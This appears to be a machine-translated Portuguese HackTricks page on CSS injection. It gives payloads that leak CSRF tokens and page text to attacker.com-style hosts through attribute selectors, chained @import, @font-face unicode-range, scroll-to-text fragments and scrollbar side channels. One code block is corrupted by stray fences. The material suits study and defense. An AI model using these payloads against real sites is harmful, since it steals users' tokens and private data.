# Inje√ß√£o de CSS

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Grupo de Seguran√ßa Try Hard**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Inje√ß√£o de CSS

### Seletor de Atributo

Os seletores CSS s√£o elaborados para corresponder aos valores dos atributos `name` e `value` de um elemento `input`. Se o atributo de valor do elemento de entrada come√ßar com um caractere espec√≠fico, um recurso externo predefinido √© carregado:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
No entanto, essa abordagem enfrenta uma limita√ß√£o ao lidar com elementos de entrada ocultos (`type="hidden"`) porque os elementos ocultos n√£o carregam backgrounds.

#### Bypass para Elementos Ocultos

Para contornar essa limita√ß√£o, voc√™ pode direcionar um elemento irm√£o subsequente usando o combinador de irm√£o geral `~`. A regra CSS ent√£o se aplica a todos os irm√£os que seguem o elemento de entrada oculto, fazendo com que a imagem de fundo seja carregada:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Um exemplo pr√°tico de explora√ß√£o dessa t√©cnica √© detalhado no trecho de c√≥digo fornecido. Voc√™ pode visualiz√°-lo [aqui](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Pr√©-requisitos para Inje√ß√£o de CSS

Para que a t√©cnica de Inje√ß√£o de CSS seja eficaz, certas condi√ß√µes devem ser atendidas:

1. **Comprimento do Payload**: O vetor de inje√ß√£o de CSS deve suportar payloads suficientemente longos para acomodar os seletores criados.
2. **Reavalia√ß√£o do CSS**: Voc√™ deve ter a capacidade de enquadrar a p√°gina, o que √© necess√°rio para acionar a reavalia√ß√£o do CSS com os payloads rec√©m-gerados.
3. **Recursos Externos**: A t√©cnica pressup√µe a capacidade de usar imagens hospedadas externamente. Isso pode ser restrito pela Pol√≠tica de Seguran√ßa de Conte√∫do (CSP) do site.

### Seletor de Atributo Cego

Como [**explicado neste post**](https://portswigger.net/research/blind-css-exfiltration), √© poss√≠vel combinar os seletores **`:has`** e **`:not`** para identificar conte√∫do mesmo de elementos cegos. Isso √© muito √∫til quando voc√™ n√£o tem ideia do que est√° dentro da p√°gina da web que carrega a inje√ß√£o de CSS.\
Tamb√©m √© poss√≠vel usar esses seletores para extrair informa√ß√µes de v√°rios blocos do mesmo tipo, como em:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Combinando isso com a seguinte t√©cnica **@import**, √© poss√≠vel exfiltrar muitas **informa√ß√µes usando inje√ß√£o de CSS em p√°ginas cegas com** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

A t√©cnica anterior tem algumas desvantagens, verifique os pr√©-requisitos. Voc√™ precisa ser capaz de **enviar v√°rios links para a v√≠tima**, ou precisa ser capaz de **inserir o iframe na p√°gina vulner√°vel √† inje√ß√£o de CSS**.

No entanto, existe outra t√©cnica inteligente que utiliza **CSS `@import`** para melhorar a qualidade da t√©cnica.

Isso foi mostrado pela primeira vez por [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) e funciona assim:

Em vez de carregar a mesma p√°gina v√°rias vezes com dezenas de payloads diferentes a cada vez (como na t√©cnica anterior), vamos **carregar a p√°gina apenas uma vez e apenas com uma importa√ß√£o para o servidor do atacante** (este √© o payload a ser enviado para a v√≠tima):
```css
@import url('//attacker.com:5001/start?');
```
1. A importa√ß√£o vai **receber algum script CSS** dos atacantes e o **navegador ir√° carreg√°-lo**.
2. A primeira parte do script CSS que o atacante enviar√° √© **outro `@import` para o servidor dos atacantes novamente**.
3. O servidor dos atacantes n√£o responder√° a essa solicita√ß√£o ainda, pois queremos vazar alguns caracteres e ent√£o responder a essa importa√ß√£o com o payload para vazar os pr√≥ximos.
4. A segunda e maior parte do payload ser√° um **payload de vazamento de seletor de atributo**.
5. Isso enviar√° para o servidor dos atacantes o **primeiro caractere do segredo e o √∫ltimo**.
6. Uma vez que o servidor dos atacantes tenha recebido o **primeiro e √∫ltimo caractere do segredo**, ele ir√° **responder √† importa√ß√£o solicitada no passo 2**.
7. A resposta ser√° exatamente a mesma dos **passos 2, 3 e 4**, mas desta vez tentar√° **encontrar o segundo caractere do segredo e depois o pen√∫ltimo**.

O atacante ir√° **seguir esse loop at√© conseguir vazar completamente o segredo**.

Voc√™ pode encontrar o [**c√≥digo original de Pepe Vila para explorar isso aqui**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ou pode encontrar quase o [**mesmo c√≥digo, mas comentado aqui**.](./#css-injection)

{% hint style="info" %}
O script tentar√° descobrir 2 caracteres de cada vez (do in√≠cio e do final) porque o seletor de atributo permite fazer coisas como:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Isso permite que o script vaze o segredo mais rapidamente.
{% endhint %}

{% hint style="warning" %}
√Äs vezes o script **n√£o detecta corretamente que o prefixo + sufixo descoberto j√° √© a bandeira completa** e continuar√° para frente (no prefixo) e para tr√°s (no sufixo) e em algum momento ir√° travar.\
N√£o se preocupe, apenas verifique a **sa√≠da** porque **voc√™ pode ver a bandeira l√°**.
{% endhint %}

### Outros seletores

Outras maneiras de acessar partes do DOM com **seletores CSS**:

* **`.classe-a-buscar:nth-child(2)`**: Isso ir√° buscar o segundo item com a classe "classe-a-buscar" no DOM.
*   Seletor **`:empty`**: Usado, por exemplo, neste [**writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### XS-Search baseado em erro

**Refer√™ncia:** [Ataque baseado em CSS: Abusando do unicode-range de @font-face](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [PoC de XS-Search baseado em erro por @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

A inten√ß√£o geral √© **usar uma fonte personalizada de um ponto de extremidade controlado** e garantir que **o texto (neste caso, 'A') seja exibido com esta fonte apenas se o recurso especificado (`favicon.ico`) n√£o puder ser carregado**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Uso de Fonte Personalizada**:
   - Uma fonte personalizada √© definida usando a regra `@font-face` dentro de uma tag `<style>` na se√ß√£o `<head>`.
   - A fonte √© nomeada como `poc` e √© buscada de um endpoint externo (`http://attacker.com/?leak`).
   - A propriedade `unicode-range` √© definida como `U+0041`, visando o caractere Unicode espec√≠fico 'A'.

2. **Elemento de Objeto com Texto de Reserva**:
   - Um elemento `<object>` com `id="poc0"` √© criado na se√ß√£o `<body>`. Este elemento tenta carregar um recurso de `http://192.168.0.1/favicon.ico`.
   - O `font-family` para este elemento √© definido como `'poc'`, conforme definido na se√ß√£o `<style>`.
   - Se o recurso (`favicon.ico`) falhar ao carregar, o conte√∫do de reserva (a letra 'A') dentro da tag `<object>` √© exibido.
   - O conte√∫do de reserva ('A') ser√° renderizado usando a fonte personalizada `poc` se o recurso externo n√£o puder ser carregado.

### Estilizando Fragmento de Rolagem-para-Texto

O pseudo-classe **`:target`** √© empregado para selecionar um elemento direcionado por um **fragmento de URL**, conforme especificado na [especifica√ß√£o de Seletores CSS N√≠vel 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). √â crucial entender que `::target-text` n√£o corresponde a nenhum elemento a menos que o texto seja explicitamente direcionado pelo fragmento.

Uma preocupa√ß√£o de seguran√ßa surge quando os atacantes exploram o recurso de fragmento **Rolagem-para-texto**, permitindo-lhes confirmar a presen√ßa de texto espec√≠fico em uma p√°gina da web ao carregar um recurso de seu servidor por meio de inje√ß√£o de HTML. O m√©todo envolve a inje√ß√£o de uma regra CSS como esta:
```css
:target::before { content : url(target.png) }
```
Nesses cen√°rios, se o texto "Administrador" estiver presente na p√°gina, o recurso `target.png` √© solicitado ao servidor, indicando a presen√ßa do texto. Uma inst√¢ncia desse ataque pode ser executada por meio de uma URL especialmente elaborada que incorpora o CSS injetado juntamente com um fragmento de rolagem de texto:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Aqui, o ataque manipula a inje√ß√£o de HTML para transmitir o c√≥digo CSS, visando o texto espec√≠fico "Administrador" atrav√©s do fragmento Scroll-to-text (`#:~:text=Administrador`). Se o texto for encontrado, o recurso indicado √© carregado, sinalizando inadvertidamente sua presen√ßa ao atacante.

Para mitiga√ß√£o, os seguintes pontos devem ser observados:

1. **Correspond√™ncia STTF Restrita**: O Fragmento Scroll-to-text (STTF) √© projetado para corresponder apenas a palavras ou frases, limitando assim sua capacidade de vazar segredos ou tokens arbitr√°rios.
2. **Restri√ß√£o aos Contextos de Navega√ß√£o de N√≠vel Superior**: O STTF opera exclusivamente em contextos de navega√ß√£o de n√≠vel superior e n√£o funciona dentro de iframes, tornando qualquer tentativa de explora√ß√£o mais percept√≠vel para o usu√°rio.
3. **Necessidade de Ativa√ß√£o do Usu√°rio**: O STTF requer um gesto de ativa√ß√£o do usu√°rio para operar, o que significa que as explora√ß√µes s√£o vi√°veis apenas por meio de navega√ß√µes iniciadas pelo usu√°rio. Esse requisito mitiga consideravelmente o risco de ataques automatizados sem intera√ß√£o do usu√°rio. No entanto, o autor do post do blog destaca condi√ß√µes espec√≠ficas e contornos (por exemplo, engenharia social, intera√ß√£o com extens√µes de navegador prevalentes) que podem facilitar a automa√ß√£o do ataque.

Consci√™ncia desses mecanismos e vulnerabilidades potenciais √© fundamental para manter a seguran√ßa na web e proteger contra t√°ticas explorat√≥rias desse tipo.

Para mais informa√ß√µes, consulte o relat√≥rio original: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Voc√™ pode conferir um [**exploit usando essa t√©cnica para um CTF aqui**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Voc√™ pode especificar **fontes externas para valores unicode espec√≠ficos** que s√≥ ser√£o **coletados se esses valores unicode estiverem presentes** na p√°gina. Por exemplo:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Quando voc√™ acessa esta p√°gina, o Chrome e o Firefox buscam "?A" e "?B" porque o n√≥ de texto de informa√ß√µes sens√≠veis cont√©m os caracteres "A" e "B". Mas o Chrome e o Firefox n√£o buscam "?C" porque n√£o cont√©m "C". Isso significa que conseguimos ler "A" e "B".

### Exfiltra√ß√£o de n√≥ de texto (I): ligaduras <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Refer√™ncia:** [Wykradanie danych w ≈õwietnym stylu ‚Äì czyli jak wykorzystaƒá CSS-y do atak√≥w na webaplikacjƒô](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

A t√©cnica descrita envolve extrair texto de um n√≥ explorando ligaduras de fonte e monitorando mudan√ßas na largura. O processo envolve v√°rias etapas:

1. **Cria√ß√£o de Fontes Personalizadas**:
- Fontes SVG s√£o criadas com glifos tendo um atributo `horiz-adv-x`, que define uma largura grande para um glifo representando uma sequ√™ncia de dois caracteres.
- Exemplo de glifo SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, onde "XY" denota uma sequ√™ncia de dois caracteres.
- Essas fontes s√£o ent√£o convertidas para o formato woff usando o fontforge.

2. **Detec√ß√£o de Mudan√ßas de Largura**:
- CSS √© usado para garantir que o texto n√£o seja quebrado (`white-space: nowrap`) e para personalizar o estilo da barra de rolagem.
- A apari√ß√£o de uma barra de rolagem horizontal, estilizada de forma distinta, atua como um indicador (or√°culo) de que uma ligadura espec√≠fica, e portanto uma sequ√™ncia de caracteres espec√≠fica, est√° presente no texto.
- O CSS envolvido:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Processo de Explora√ß√£o**:
- **Passo 1**: Fontes s√£o criadas para pares de caracteres com largura substancial.
- **Passo 2**: Um truque baseado em barra de rolagem √© empregado para detectar quando o glifo de largura grande (ligadura para um par de caracteres) √© renderizado, indicando a presen√ßa da sequ√™ncia de caracteres.
- **Passo 3**: Ao detectar uma ligadura, novos glifos representando sequ√™ncias de tr√™s caracteres s√£o gerados, incorporando o par detectado e adicionando um caractere precedente ou sucessivo.
- **Passo 4**: A detec√ß√£o da ligadura de tr√™s caracteres √© realizada.
- **Passo 5**: O processo se repete, revelando progressivamente todo o texto.

4. **Otimiza√ß√£o**:
- O m√©todo atual de inicializa√ß√£o usando `<meta refresh=...` n√£o √© √≥timo.
- Uma abordagem mais eficiente poderia envolver o truque `@import` do CSS, aprimorando o desempenho da explora√ß√£o.

### Exfiltra√ß√£o de n√≥ de texto (II): vazando o conjunto de caracteres com uma fonte padr√£o (sem a necessidade de ativos externos) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Refer√™ncia:** [PoC usando Comic Sans por @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Este truque foi lan√ßado neste [**t√≥pico do Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with_single\_css\_injection/). O conjunto de caracteres usado em um n√≥ de texto pode ser vazado **usando as fontes padr√£o** instaladas no navegador: n√£o s√£o necess√°rias fontes externas -ou personalizadas-.

O conceito gira em torno de utilizar uma anima√ß√£o para expandir incrementalmente a largura de um `div`, permitindo que um caractere por vez fa√ßa a transi√ß√£o da parte 'sufixo' do texto para a parte 'prefixo'. Esse processo divide efetivamente o texto em duas se√ß√µes:

1. **Prefixo**: A linha inicial.
2. **Sufixo**: A(s) linha(s) subsequente(s).

As etapas de transi√ß√£o dos caracteres apareceriam da seguinte forma:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Durante essa transi√ß√£o, o **truque de intervalo unicode** √© empregado para identificar cada novo caractere √† medida que ele se junta ao prefixo. Isso √© alcan√ßado mudando a fonte para Comic Sans, que √© notavelmente mais alta que a fonte padr√£o, consequentemente acionando uma barra de rolagem vertical. A apari√ß√£o dessa barra de rolagem revela indiretamente a presen√ßa de um novo caractere no prefixo.

Embora este m√©todo permita a detec√ß√£o de caracteres √∫nicos √† medida que aparecem, ele n√£o especifica qual caractere est√° sendo repetido, apenas que uma repeti√ß√£o ocorreu.

{% hint style="info" %}
Basicamente, o **intervalo unicode √© usado para detectar um caractere**, mas como n√£o queremos carregar uma fonte externa, precisamos encontrar outra maneira.\
Quando o **caractere** √© **encontrado**, ele √© **atribu√≠do** √† fonte **Comic Sans pr√©-instalada**, que o **torna maior** e **aciona uma barra de rolagem** que ir√° **vazar o caractere encontrado**.
{% endhint %}

Verifique o c√≥digo extra√≠do do PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```markdown
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Exfiltra√ß√£o de n√≥ de texto (III): vazando o conjunto de caracteres com uma fonte padr√£o ao ocultar elementos (n√£o exigindo ativos externos) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Refer√™ncia:** Isso √© mencionado como [uma solu√ß√£o malsucedida neste artigo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Este caso √© muito semelhante ao anterior, no entanto, neste caso, o objetivo de tornar caracteres espec√≠ficos maiores do que outros √© ocultar algo, como um bot√£o para n√£o ser pressionado pelo bot ou uma imagem que n√£o ser√° carregada. Portanto, poder√≠amos medir a a√ß√£o (ou a falta de a√ß√£o) e saber se um caractere espec√≠fico est√° presente dentro do texto.

### Exfiltra√ß√£o de n√≥ de texto (III): vazando o conjunto de caracteres pelo tempo de cache (n√£o exigindo ativos externos) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Refer√™ncia:** Isso √© mencionado como [uma solu√ß√£o malsucedida neste artigo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Neste caso, poder√≠amos tentar vazar se um caractere est√° no texto carregando uma fonte falsa da mesma origem:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Se houver uma correspond√™ncia, a **fonte ser√° carregada de `/static/bootstrap.min.css?q=1`**. Embora n√£o seja carregada com sucesso, o **navegador deve armazen√°-la em cache**, e mesmo que n√£o haja cache, h√° um mecanismo de **304 n√£o modificado**, ent√£o a **resposta deve ser mais r√°pida** do que outras coisas.

No entanto, se a diferen√ßa de tempo entre a resposta em cache e a n√£o em cache n√£o for grande o suficiente, isso n√£o ser√° √∫til. Por exemplo, o autor mencionou: No entanto, ap√≥s testes, descobri que o primeiro problema √© que a velocidade n√£o √© muito diferente, e o segundo problema √© que o bot usa a flag `disk-cache-size=1`, o que √© realmente atencioso.

### Exfiltra√ß√£o de n√≥ de texto (III): vazando o conjunto de caracteres cronometrando o carregamento de centenas de "fontes" locais (n√£o requer ativos externos) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Refer√™ncia:** Isso √© mencionado como [uma solu√ß√£o malsucedida neste artigo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Neste caso, voc√™ pode indicar **CSS para carregar centenas de fontes falsas** da mesma origem quando ocorrer uma correspond√™ncia. Dessa forma, voc√™ pode **medir o tempo** que leva e descobrir se um caractere aparece ou n√£o com algo como:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
E o c√≥digo do bot se parece com isso:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Portanto, se a fonte n√£o corresponder, o tempo de resposta ao visitar o bot √© esperado ser de aproximadamente 30 segundos. No entanto, se houver uma correspond√™ncia de fonte, v√°rias solicita√ß√µes ser√£o enviadas para recuperar a fonte, causando atividade cont√≠nua na rede. Como resultado, levar√° mais tempo para satisfazer a condi√ß√£o de parada e receber a resposta. Portanto, o tempo de resposta pode ser usado como um indicador para determinar se h√° uma correspond√™ncia de fonte.

## Refer√™ncias

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
